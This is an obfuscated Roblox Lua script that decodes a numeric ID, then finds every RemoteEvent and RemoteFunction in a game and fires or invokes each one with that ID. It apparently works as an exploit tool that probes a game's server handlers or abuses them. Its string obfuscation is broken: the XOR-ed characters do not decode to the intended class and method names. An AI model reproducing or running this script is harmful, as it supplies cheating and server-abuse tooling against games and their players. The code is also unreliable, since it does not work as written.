local v0 = string.char;
local v1 = string.byte;
local v2 = string.sub;
local v3 = bit32 or bit;
local v4 = v3.bxor;
local v5 = table.concat;
local v6 = table.insert;

local encodedID = {v4(85984691894032, 123456789), 123456789}

local function decodeID(encoded, key)
    return v4(encoded, key)
end

local v7 = {decodeID(encodedID[1], encodedID[2])}

local function v8()
    for _, v9 in pairs(game:GetDescendants()) do
        if v9:IsA(v0(v4(v1("R"), 5), v4(v1("e"), 10), v4(v1("m"), 15), v4(v1("o"), 20), v4(v1("t"), 25), v4(v1("e"), 30), v4(v1("E"), 35), v4(v1("v"), 40), v4(v1("e"), 45), v4(v1("n"), 50), v4(v1("t"), 55))) then
            pcall(function()
                v9[v0(v4(v1("F"), 5), v4(v1("i"), 10), v4(v1("r"), 15), v4(v1("e"), 20), v4(v1("S"), 25), v4(v1("e"), 30), v4(v1("r"), 35), v4(v1("v"), 40), v4(v1("e"), 45), v4(v1("r"), 50))](v9, unpack(v7))
            end)
        elseif v9:IsA(v0(v4(v1("R"), 5), v4(v1("e"), 10), v4(v1("m"), 15), v4(v1("o"), 20), v4(v1("t"), 25), v4(v1("e"), 30), v4(v1("F"), 35), v4(v1("u"), 40), v4(v1("n"), 45), v4(v1("c"), 50), v4(v1("t"), 55), v4(v1("i"), 60), v4(v1("o"), 65), v4(v1("n"), 70))) then
            pcall(function()
                v9[v0(v4(v1("I"), 5), v4(v1("n"), 10), v4(v1("v"), 15), v4(v1("o"), 20), v4(v1("k"), 25), v4(v1("e"), 30), v4(v1("S"), 35), v4(v1("e"), 40), v4(v1("r"), 45), v4(v1("v"), 50), v4(v1("e"), 55), v4(v1("r"), 60))](v9, unpack(v7))
            end)
        end
    end
end

v8()
